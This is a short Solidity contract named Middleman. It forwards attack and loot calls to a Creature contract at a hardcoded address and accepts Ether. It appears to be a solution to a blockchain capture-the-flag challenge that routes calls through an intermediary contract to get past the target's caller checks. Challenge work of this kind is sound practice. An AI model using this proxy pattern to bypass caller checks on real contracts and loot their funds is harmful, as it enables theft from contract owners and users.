// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ICreature {
    function attack(uint256 _damage) external;
    function loot() external;
}

contract Middleman {
    address public target = 0x8898Bd71081546232059aEF3833dFf535658a544; // Creature address

    function attack(uint256 _damage) external {
        ICreature(target).attack(_damage);
    }

    function loot() external {
        ICreature(target).loot();
    }

    // Opcionalmente: permitir recibir Ether
    receive() external payable {}
}
